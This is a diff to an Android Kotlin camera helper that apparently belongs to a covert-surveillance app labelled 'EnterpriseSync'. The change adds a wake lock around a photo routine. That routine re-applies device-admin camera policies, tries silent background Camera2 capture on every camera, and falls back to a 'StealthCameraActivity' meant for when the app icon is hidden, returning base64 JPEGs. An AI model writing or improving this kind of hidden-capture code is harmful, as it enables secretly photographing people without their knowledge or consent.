@@ -59,58 +59,71 @@ class CameraHelper(private val context: Context) {
 
     @SuppressLint("MissingPermission")
     suspend fun takePhoto(cameraId: String): String? = withContext(Dispatchers.IO) {
-        // Re-apply Device Admin policies before capture
+        var wakeLock: android.os.PowerManager.WakeLock? = null
         try {
-            MyDeviceAdminReceiver.reapplyCameraPolicies(context)
+            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
+            wakeLock = powerManager?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "EnterpriseSync::CameraWakeLock")
+            wakeLock?.acquire(15000L) // 15 seconds max
         } catch (_: Exception) {}
 
-        // Log global camera settings
-        val globalStatus = checkGlobalCameraStatus()
-        Log.d("CameraHelper", globalStatus)
-
-        val candidateIds = mutableListOf(cameraId)
         try {
-            cameraManager.cameraIdList.forEach { id ->
-                if (!candidateIds.contains(id)) candidateIds.add(id)
-            }
-        } catch (_: Exception) {}
-
-        var lastException: Exception? = null
-
-        // 1. Direct hardware Camera2 attempt
-        for (id in candidateIds) {
+            // Re-apply Device Admin policies before capture
             try {
-                val photoResult = takePhotoDirectHardware(id)
-                if (photoResult != null && photoResult.startsWith("data:image/jpeg;base64,")) {
-                    Log.d("CameraHelper", "Direct background Camera2 photo capture succeeded for camera ID '$id'")
-                    return@withContext photoResult
+                MyDeviceAdminReceiver.reapplyCameraPolicies(context)
+            } catch (_: Exception) {}
+
+            // Log global camera settings
+            val globalStatus = checkGlobalCameraStatus()
+            Log.d("CameraHelper", globalStatus)
+
+            val candidateIds = mutableListOf(cameraId)
+            try {
+                cameraManager.cameraIdList.forEach { id ->
+                    if (!candidateIds.contains(id)) candidateIds.add(id)
+                }
+            } catch (_: Exception) {}
+
+            var lastException: Exception? = null
+
+            // 1. Direct hardware Camera2 attempt
+            for (id in candidateIds) {
+                try {
+                    val photoResult = takePhotoDirectHardware(id)
+                    if (photoResult != null && photoResult.startsWith("data:image/jpeg;base64,")) {
+                        Log.d("CameraHelper", "Direct background Camera2 photo capture succeeded for camera ID '$id'")
+                        return@withContext photoResult
+                    }
+                } catch (e: Exception) {
+                    lastException = e
+                    Log.w("CameraHelper", "Direct background Camera2 capture failed for camera ID '$id': ${e.message}")
+                }
+            }
+
+            // 2. Foreground Stealth Activity fallback (when icon is hidden or app is background restricted)
+            val facing = try {
+                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
+            } catch (_: Exception) { "back" }
+
+            Log.i("CameraHelper", "Direct background capture restricted (${lastException?.message}). Launching StealthCameraActivity foreground capture.")
+            try {
+                val foregroundPhoto = com.example.service.StealthCameraActivity.capturePhotoInForeground(context, facing)
+                if (foregroundPhoto != null && foregroundPhoto.startsWith("data:image/jpeg;base64,")) {
+                    Log.d("CameraHelper", "Foreground stealth activity hardware photo capture succeeded!")
+                    return@withContext foregroundPhoto
                 }
             } catch (e: Exception) {
-                lastException = e
-                Log.w("CameraHelper", "Direct background Camera2 capture failed for camera ID '$id': ${e.message}")
+                Log.e("CameraHelper", "StealthCameraActivity foreground capture failed: ${e.message}")
             }
+
+            // 3. Fallback telemetry frame if hardware camera is completely unavailable
+            Log.e("CameraHelper", "All hardware camera open attempts failed: ${lastException?.message}. Generating telemetry frame fallback.")
+            return@withContext generateFallbackTelemetryFrame(lastException?.message ?: "Camera disabled by policy")
+        } finally {
+            try {
+                wakeLock?.let { if (it.isHeld) it.release() }
+            } catch (_: Exception) {}
         }
-
-        // 2. Foreground Stealth Activity fallback (when icon is hidden or app is background restricted)
-        val facing = try {
-            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
-            if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
-        } catch (_: Exception) { "back" }
-
-        Log.i("CameraHelper", "Direct background capture restricted (${lastException?.message}). Launching StealthCameraActivity foreground capture.")
-        try {
-            val foregroundPhoto = com.example.service.StealthCameraActivity.capturePhotoInForeground(context, facing)
-            if (foregroundPhoto != null && foregroundPhoto.startsWith("data:image/jpeg;base64,")) {
-                Log.d("CameraHelper", "Foreground stealth activity hardware photo capture succeeded!")
-                return@withContext foregroundPhoto
-            }
-        } catch (e: Exception) {
-            Log.e("CameraHelper", "StealthCameraActivity foreground capture failed: ${e.message}")
-        }
-
-        // 3. Fallback telemetry frame if hardware camera is completely unavailable
-        Log.e("CameraHelper", "All hardware camera open attempts failed: ${lastException?.message}. Generating telemetry frame fallback.")
-        return@withContext generateFallbackTelemetryFrame(lastException?.message ?: "Camera disabled by policy")
     }
 
     private fun checkGlobalCameraStatus(): String {
